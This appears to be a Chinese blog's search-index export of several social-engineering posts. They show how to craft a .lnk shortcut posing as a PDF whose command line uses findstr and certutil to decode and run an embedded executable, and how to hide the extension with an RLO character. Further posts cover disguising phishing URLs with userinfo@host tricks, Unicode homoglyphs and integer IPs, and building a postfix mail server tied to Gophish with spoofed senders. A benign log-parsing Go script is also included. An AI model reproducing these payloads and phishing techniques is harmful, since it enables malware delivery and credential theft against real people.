<h5 id="这时可直接编辑该文件设置其参数"><a href="#这时可直接编辑该文件设置其参数" class="headerlink" title="这时可直接编辑该文件设置其参数"></a>这时可直接编辑该文件设置其参数</h5><p>下面以010Editor为例</p>
<p>在COMMAND_LINE_ARGUMENTS中，注意此处为宽字节</p>
<p><img src="/images/1665472376694-53070b44-f220-424b-b8ad-f9a3f34be83b.png"></p>
<p>我们这里将长度更改为 300，与其对应的，在 01FBH处添加 (300 - 157) * 2 &#x3D; 286个字节。</p>
<p><img src="/images/1665472900336-5d026455-8c2d-43db-978d-2a612e066b7b.png"></p>
<p><img src="/images/1665473037840-4930e672-fdf9-4e8a-8133-448b5a6c3d5c.png"></p>
<p><img src="/images/1665473487702-0069c60a-9e84-447d-af7d-2a1af56fd50f.png"></p>
<p>然后再填入相关命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/c copy cmd.pdf.lnk %temp%\cmdhack &amp; findstr &quot;TVqQAAMAAAAEAAA&quot; %temp%\cmdhack &gt; %temp%\hack &amp; certutil -decode %temp%\hack %temp%\cmd.exe &amp; %temp%\cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665474657690-79b0425a-0e96-47cb-864b-5b504b7990e6.png"></p>
<p>运行即上线</p>
<p><img src="/images/1665475113282-ffede604-f1b5-48dc-93f4-9b904c30c2d0.png"></p>
<h2 id="隐藏后缀"><a href="#隐藏后缀" class="headerlink" title="隐藏后缀"></a>隐藏后缀</h2><p>上述lnk和真实的pdf相比，还多了一个快捷方式的标志</p>
<p><img src="/images/1665451568354-fc4ef57e-c5f6-46da-ac29-dff3436a976a.png"></p>
<p>而且在单独发送该快捷方式文件时，会显示出Lnk后缀</p>
<p><img src="/images/1665451618704-cfaa2519-a622-4b91-871d-c7021a961989.png"></p>
<p>这时我们可以选择在文件名中插入unicode字符，来实现一个视觉上的隐藏效果</p>
<h5 id="借助RLO字符"><a href="#借助RLO字符" class="headerlink" title="借助RLO字符"></a>借助RLO字符</h5><p>借助RLO字符使部分字符从右向左读</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;RLO&gt;可以使文件名，把&lt;RLO&gt;后面的字符串反向输出</span><br></pre></td></tr></table></figure>

<h5 id="注意，不能直接输入-lt-gt"><a href="#注意，不能直接输入-lt-gt" class="headerlink" title="注意，不能直接输入&lt;&gt;"></a>注意，不能直接输入&lt;&gt;</h5><p><img src="/images/1665476335516-aa884d29-153d-49d7-b917-f6a3a31ca4f6.png"></p>
<h5 id="右键–-gt-插入unicode"><a href="#右键–-gt-插入unicode" class="headerlink" title="右键–&gt;插入unicode"></a>右键–&gt;插入unicode</h5><p>在想要插入的地方右键–&gt;插入unicode–&gt;RLO</p>
<p><img src="/images/1665477214353-8e64941a-4d98-4867-81c1-8d90ee2cefb2.png"></p>
<p><img src="/images/1665477331163-0842d5f8-ec5c-4ea0-ac1d-7f45940b558a.png"></p>
<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p>将快捷方式重命名为M<RLO>fdp.历简</RLO></p>
<p><img src="/images/1665477692051-f245a0b4-655d-4186-915f-397caa397b2e.png"></p>
<p>并不更改文件属性</p>
<p><img src="/images/1665477821386-e204c1de-cc0b-465d-b43a-2579d1bf9766.png"></p>
<p>注意修改完文件名，命令也需要修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">M‮fdp.历简.lnk</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665478534564-b79529b0-91eb-44ae-9be5-be4f3f0b114a.png"></p>
<p>注意，复制完直接粘贴过去，因为<RLO>粘贴进去会显示为其他东东</RLO></p>
<p><img src="/images/1665478705153-885c62ce-8894-4e3f-830f-9b9b06f3f68c.png"></p>
<p>运行即上线</p>
<p><img src="/images/1665478279003-94c1ad2c-d640-46c7-b1f3-47e111d364c3.png"></p>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
  </entry>
  <entry>
    <title>读取并筛选postfix日志</title>
    <url>/2023/05/22/%E7%A4%BE%E5%B7%A5/%E8%AF%BB%E5%8F%96%E5%B9%B6%E7%AD%9B%E9%80%89postfix%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<h3 id="读取postfix日志命令"><a href="#读取postfix日志命令" class="headerlink" title="读取postfix日志命令"></a>读取postfix日志命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">journalctl -u postfix.service</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230522094433290.png" alt="image-20230522094433290"></p>
<h3 id="邮件投递状态码"><a href="#邮件投递状态码" class="headerlink" title="邮件投递状态码"></a>邮件投递状态码</h3><h5 id="邮件投递成功返回码"><a href="#邮件投递成功返回码" class="headerlink" title="邮件投递成功返回码"></a>邮件投递成功返回码</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">250 send mail ok 邮件投递成功返回码</span><br></pre></td></tr></table></figure>

<h5 id="邮件投递失败返回码"><a href="#邮件投递失败返回码" class="headerlink" title="邮件投递失败返回码"></a>邮件投递失败返回码</h5><p>邮件投递失败，邮件推送或邮件接收方会返回退信代码。</p>
<p>返回码：4xx，表示临时性错误；</p>
<p>返回码：5xx，表示永久性错误。</p>
<p>接收方返回临时性错误（返回码：4xx），邮件推送会多次重试投递。</p>
<p>不同邮件服务商的用于表明邮件投递失败原因的退信代码不同。</p>
<h5 id="常见失败返回码"><a href="#常见失败返回码" class="headerlink" title="常见失败返回码"></a>常见失败返回码</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">退信原因：IP问题或者邮件内容问题</span><br><span class="line">543 suspected spams or account(IP) exception</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">501 Invalid Client IP</span><br><span class="line">接收邮箱服务器返回的退信语义，具体原因请参考接收邮箱服务器解释。</span><br></pre></td></tr></table></figure>

<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><a href="https://help.aliyun.com/document_detail/44499.html">https://help.aliyun.com/document_detail/44499.html</a></p>
<h3 id="golang筛选所需条目"><a href="#golang筛选所需条目" class="headerlink" title="golang筛选所需条目"></a>golang筛选所需条目</h3><p>以543状态码为例</p>
<h5 id="将日志导出"><a href="#将日志导出" class="headerlink" title="将日志导出"></a>将日志导出</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">journalctl -u postfix.service &gt; log.txt</span><br></pre></td></tr></table></figure>

<h5 id="筛选出指定响应码的行"><a href="#筛选出指定响应码的行" class="headerlink" title="筛选出指定响应码的行"></a>筛选出指定响应码的行</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func readLog(filePath string) &#123;</span><br><span class="line">	file, err := os.Open(filePath)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">	defer file.Close()</span><br><span class="line"></span><br><span class="line">	scanner := bufio.NewScanner(file)</span><br><span class="line">	for scanner.Scan() &#123;</span><br><span class="line">		if strings.Contains(strings.TrimSpace(scanner.Text()), &quot;543 suspected spams or account(IP) exception&quot;) &#123;</span><br><span class="line">			fmt.Println(strings.TrimSpace(scanner.Text()))</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到筛选出所有543返回码的行，马赛克的位置是收件邮箱，表示发送给该地址的邮件被退回</p>
<p><img src="/images/image-20230522104317336.png" alt="image-20230522104317336"></p>
<h5 id="筛选出指定响应码的收件邮箱"><a href="#筛选出指定响应码的收件邮箱" class="headerlink" title="筛选出指定响应码的收件邮箱"></a>筛选出指定响应码的收件邮箱</h5><p>上面输出后可以知道，发送失败的邮箱被包含在&lt;&gt;中</p>
<p>将其用正则提出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func getMail(str string) &#123;</span><br><span class="line">	re := regexp.MustCompile(`&lt;(.*@.*)&gt;`)</span><br><span class="line">	emails := re.FindString(str)</span><br><span class="line">	fmt.Println(emails)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>导出后，全局把两头的尖括号删除即可</p>
<h3 id="总"><a href="#总" class="headerlink" title="总"></a>总</h3><p>最后的代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;bufio&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">	&quot;regexp&quot;</span><br><span class="line">	&quot;strings&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	readLog(`D:/desktop/log.txt`)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func readLog(filePath string) &#123;</span><br><span class="line">	file, err := os.Open(filePath)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">	defer file.Close()</span><br><span class="line"></span><br><span class="line">	scanner := bufio.NewScanner(file)</span><br><span class="line">	for scanner.Scan() &#123;</span><br><span class="line">		if strings.Contains(strings.TrimSpace(scanner.Text()), &quot;543 suspected spams or account(IP) exception&quot;) &#123;</span><br><span class="line">			getMail(strings.TrimSpace(scanner.Text()))</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func getMail(str string) &#123;</span><br><span class="line">	re := regexp.MustCompile(`&lt;(.*@.*)&gt;`)</span><br><span class="line">	emails := re.FindString(str)</span><br><span class="line">	fmt.Println(emails)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>社工</category>
      </categories>
  </entry>
  <entry>
    <title>钓鱼之url魔改</title>
    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/%E9%92%93%E9%B1%BC%E4%B9%8Burl%E9%AD%94%E6%94%B9/</url>
    <content><![CDATA[<h3 id="url语法格式利用"><a href="#url语法格式利用" class="headerlink" title="url语法格式利用"></a>url语法格式利用</h3><p>url的语法格式可以细分为九个部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scheme&gt;://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt;</span><br></pre></td></tr></table></figure>

<p>拿http协议的url举例，我们通常不会在host前加用户名密码对，这是因为请求的资源匿名即可访问</p>
<p>但是在host前加上用户名密码对也并不会影响资源的访问，借此我们可以在url中构造任意的用户名密码对</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://root:123456@www.baidu.com</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://root@www.baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230209090030474.png" alt="image-20230209090030474"></p>
<p>点击“是”后正常访问百度(换个浏览器甚至都不弹窗)</p>
<p>所以，如果要构造一个模拟百度的恶意请求，实则是访问hacker.com</p>
<p>可以通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com@hacker.com</span><br></pre></td></tr></table></figure>

<p>点击后访问的便是hacker.com</p>
<p><img src="/images/image-20230209090523890.png" alt="image-20230209090523890"></p>
<p>为了更隐蔽，可以像添加参数一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com&amp;action=login@hacker.com</span><br></pre></td></tr></table></figure>

<p>此时”<a href="http://www.baidu.com&action=login" 为用户名 ">www.baidu.com&amp;action=login&quot;为用户名</a></p>
<h3 id="浏览器域名解码利用"><a href="#浏览器域名解码利用" class="headerlink" title="浏览器域名解码利用"></a>浏览器域名解码利用</h3><p>上述对url进行了一番伪造，但是隐藏在url后面的真实域名hacker.com仍会引起警.</p>
<p>由于DNS服务器的解析是由英文代码所构成，所以浏览器会在访问资源前会对域名进行解码，而多个ascii字符会被解码成同一个英文字母，我们可以编写简单的JavaScript脚本进行fuzz。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (let i=0;i&lt;=65535;i++)</span><br><span class="line">&#123;</span><br><span class="line">    var a = &#x27;https://&#x27;+ String.fromCharCode(i) +&#x27;acker.com&#x27;;</span><br><span class="line">    try&#123;</span><br><span class="line">        let url = new URL(a);</span><br><span class="line">         if (url.hostname &amp;&amp; url.hostname == &quot;hacker.com&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                console.log(i,String.fromCharCode(i));</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;catch&#123;</span><br><span class="line">        // console.log(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230209092819579.png" alt="image-20230209092819579"></p>
<p>比如英文字母”h”同时对应</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">72 H </span><br><span class="line">104 h </span><br><span class="line">688 ʰ </span><br><span class="line">7476 ᴴ </span><br><span class="line">8341 ₕ </span><br><span class="line">8459 ℋ </span><br><span class="line">8460 ℌ </span><br><span class="line">8461 ℍ </span><br><span class="line">8462 ℎ </span><br><span class="line">9405 Ⓗ </span><br><span class="line">9431 ⓗ </span><br><span class="line">65320 Ｈ </span><br><span class="line">65352 ｈ</span><br></pre></td></tr></table></figure>

<p>url就可以构造为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.bing.com&amp;action=login@ℋacker.com</span><br></pre></td></tr></table></figure>

<p>成功访问hacker.com</p>
<p><img src="/images/image-20230209093356378.png" alt="image-20230209093356378"></p>
<p>配合一些短链接可避开hacker这样的字段</p>
<p>短链接在线生成</p>
<p><a href="https://urls.vip/">https://urls.vip/</a></p>
<h3 id="IP整数形式利用"><a href="#IP整数形式利用" class="headerlink" title="IP整数形式利用"></a>IP整数形式利用</h3><p>还可以通过ip地址替换hacker.com</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com&amp;action=login@127.0.0.1:88</span><br></pre></td></tr></table></figure>

<p>为了更好的隐藏ip地址，我们可以将ip地址的点分十进制表示方式转换为整数表示，转换原理的简单解释：</p>
<p>IP 地址（IPv4）由32 位的 8 位二进制文件的组合组成。</p>
<p>由于输入实际的二进制组合（例如：11000000）非常不方便，因此使用与二进制对应的十进制（例如：192），浏览器在解析整数形式的ip地址时，会将URL中的十进制转换为二进制并分割成8位，然后从将8位的二进制数字转换为对应的十进制。</p>
<p>拿127.0.0.1举例，对应的二进制应该是01111111 00000000 00000000 00000001，二进制进一步转换成得到整数形式的IP 2130706433</p>
<p><img src="/images/image-20230209094020470.png" alt="image-20230209094020470"></p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://2130706433:88</span><br></pre></td></tr></table></figure>

<p>访问后会跳转到127.0.0.1</p>
<p><img src="/images/image-20230209094134131.png" alt="image-20230209094134131"></p>
<p>于是url进一步伪造成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com&amp;action=login@2130706433:88</span><br></pre></td></tr></table></figure>

<p>末尾可以使用frag稍加修饰，最终我们将ikun.org 魔改成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com&amp;action=login@2130706433:88#test.docx</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230209094507161.png" alt="image-20230209094507161"></p>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
  </entry>
  <entry>
    <title>邮服搭建和实例(postfix)</title>
    <url>/2023/05/11/%E7%A4%BE%E5%B7%A5/%E9%82%AE%E6%9C%8D%E6%90%AD%E5%BB%BA%E5%92%8C%E5%AE%9E%E4%BE%8B(postfix)/</url>
    <content><![CDATA[<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p><a href="https://www.godaddy.com/zh-sg">域名注册购买,云服务器,建站,企业邮箱和网站安全-GoDaddy官方中文站</a></p>
<p>该站点可以用支付宝支付</p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>进去后更改币种为人名币</p>
<p>除了域名啥都不买</p>
<p>不一定要.com</p>
<h2 id="云服务器"><a href="#云服务器" class="headerlink" title="云服务器"></a>云服务器</h2><p>阿贝云暂时不受SMTP 25端口的限制</p>
<p><a href="https://www.abeiyun.com/">https://www.abeiyun.com/</a></p>
<p>系统建议使用centos 8.2及以上</p>
<p><img src="/images/image-20230210154908765.png" alt="image-20230210154908765"></p>
<h2 id="DNS配置"><a href="#DNS配置" class="headerlink" title="DNS配置"></a>DNS配置</h2><h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><p>可以先配一个泛解析测试下</p>
<p>添加一条A记录，name写*，值写服务器ip</p>
<p><img src="/images/1666349582335-e4583d52-a9d2-4f39-b874-4b1b01d6c04b.png"></p>
<p>服务器开启一个http服务</p>
<p><img src="/images/1666349641171-2efeb1fa-76df-4eae-86bc-b546d248dd5f.png"></p>
<p>使用域名访问</p>
<p><img src="/images/1666349684950-3aa17cec-1342-4048-843a-1ef108aeeb18.png"></p>
<p>注意，新起的服务器需要关闭防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld.service</span><br><span class="line">systemctl disable firewalld.service //关闭防火墙自启动</span><br></pre></td></tr></table></figure>

<h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p>DNS中添加两条记录</p>
<p>一条A记录</p>
<p><img src="/images/1666349861459-fafebced-e4f8-4301-993a-fb6c9d6f05d9.png"></p>
<p>一条MX记录</p>
<p><img src="/images/1666350014537-873ce195-1c8f-402f-9510-a65fd3ab9420.png"></p>
<p>当发信侧服务器给受信侧发邮件时，首先会要求DNS服务器解析受信侧邮箱地址中@后面部分的域名对应的MX记录（DNS的写法可以理解成example.com 的A记录下面，有一行上面示例的MX记录，当然邮箱服务器也有对应的A记录）。</p>
<h2 id="邮服搭建"><a href="#邮服搭建" class="headerlink" title="邮服搭建"></a>邮服搭建</h2><p>常见的邮件服务器软件：</p>
<p>sendmail：性能好，设置复杂，适合老手</p>
<p>qmail：体积小260+k ，模块化。需要做二次开发，适合对邮件性能有要求的</p>
<p>postfix：前身是sendmail，postfix原本是sendmail里面的一个模块</p>
<p>zmailer：近几年才出来的邮件</p>
<p>coremail：国内做的最好的商业平台，运行在linux上</p>
<p>这里环境踩了很多坑，建议使用ubuntu 18以上，centos 8.2以上</p>
<h5 id="本次搭建使用的是"><a href="#本次搭建使用的是" class="headerlink" title="本次搭建使用的是"></a>本次搭建使用的是</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基础环境 </span><br><span class="line"> -centos8.2 x86_64</span><br><span class="line">邮服软件 </span><br><span class="line"> -postfix</span><br><span class="line"> -mailutils</span><br></pre></td></tr></table></figure>

<h5 id="安装postfix"><a href="#安装postfix" class="headerlink" title="安装postfix"></a>安装postfix</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y postfix</span><br></pre></td></tr></table></figure>

<h5 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h5><p>相关配置文件在&#x2F;etc&#x2F;postfix下</p>
<p>首先备份一份配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /etc/postfix/main.cf /etc/postfix/main.cf.bak</span><br></pre></td></tr></table></figure>

<p><img src="/images/1666350724296-7bf6a708-3432-4114-9518-417a3dab9dda.png"></p>
<p>修改文件内容，可以参考下面内容，逐条修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/postfix/main.cf</span><br></pre></td></tr></table></figure>

<p>注意每个字段别有重复，有重复#注释掉就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myhostname = mail.域名</span><br><span class="line">mydomain = 域名</span><br><span class="line">myorigin = $mydomain</span><br><span class="line">inet_interfaces = all</span><br><span class="line">mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain</span><br><span class="line">mynetworks = 127.0.0.0/8</span><br><span class="line">home_mailbox = Maildir/</span><br><span class="line">smtpd_banner = $myhostname ESMTP</span><br></pre></td></tr></table></figure>

<h5 id="启动postfix服务"><a href="#启动postfix服务" class="headerlink" title="启动postfix服务"></a>启动postfix服务</h5><p>启动并开机自启postfix</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart postfix</span><br><span class="line">systemctl enable postfix</span><br></pre></td></tr></table></figure>

<p><img src="/images/1666351194674-a00a901b-4e15-43d1-be1f-0889072d98ed.png"></p>
<h5 id="安装mailutils"><a href="#安装mailutils" class="headerlink" title="安装mailutils"></a>安装mailutils</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install mailx -y</span><br></pre></td></tr></table></figure>

<h3 id="发送测试邮件"><a href="#发送测试邮件" class="headerlink" title="发送测试邮件"></a>发送测试邮件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Mail Content&quot; | mail -s &quot;Mail Subject&quot; xxx@qq.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/1666357875177-5b4f5419-32c8-43fa-b66b-703bbd5386e4.png"></p>
<h5 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h5><p>如果出现异常，可以通过如下命令查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status postfix.service</span><br></pre></td></tr></table></figure>

<p>例如</p>
<p><img src="/images/1666356865334-7d51bff6-c66b-467b-bb4e-da3359f66b3b.png"></p>
<p>出现该问题有可能是被QQ邮箱拦截</p>
<p>可以设置域名白名单从而进行测试</p>
<p><img src="/images/1666357723308-3b5459e4-9878-4f63-967a-2c084c516998.png"></p>
<h2 id="联动gophish"><a href="#联动gophish" class="headerlink" title="联动gophish"></a>联动gophish</h2><p>需要在搭建的邮服上也部署gophish</p>
<p>gophish的搭建过程在Gophish钓鱼中有写</p>
<p><a href="https://www.yuque.com/fried_rice/gazfyf/ge7yxd">Gophish钓鱼 · 语雀</a></p>
<p><img src="/images/1666360801210-ada128af-df4a-46bc-b748-d4a3b6bd7952.png"></p>
<h5 id="sending-Profiles配置"><a href="#sending-Profiles配置" class="headerlink" title="sending Profiles配置"></a>sending Profiles配置</h5><p>SMTP可以自定义</p>
<p>Host为127.0.0.1:25</p>
<p><img src="/images/1666360880306-dfae67ad-8b66-417d-8e9c-39e4e4147dcc.png"></p>
<p>后面的username和password不用填</p>
<p>如果SMTP From不是邮服的域名，被拦截的几率会变大，但也可以使用一些不太出名的后缀，比如asdasdfas.com这样</p>
<h5 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h5><p>参考《Gophish钓鱼》</p>
<p><a href="https://www.yuque.com/fried_rice/gazfyf/ge7yxd">Gophish钓鱼 · 语雀</a></p>
<h5 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h5><p>这里可以直接用Gophish发送一封测试邮件</p>
<p><img src="/images/1666362044480-5f2afd89-b604-4a88-93a7-52bb36f97bc8.png"></p>
<p>可以看到发件人变为我们自定义的</p>
<p><img src="/images/1666362095958-d116546e-a3da-4b2c-87a7-897ed4f10a69.png"></p>
<p>注意，可能是我之前用qq邮箱干过啥，不确定的邮件都发不进来，所以这里也需要将admin.com加入白名单域名</p>
]]></content>
      <categories>
        <category>社工</category>
      </categories>
  </entry>
</search>
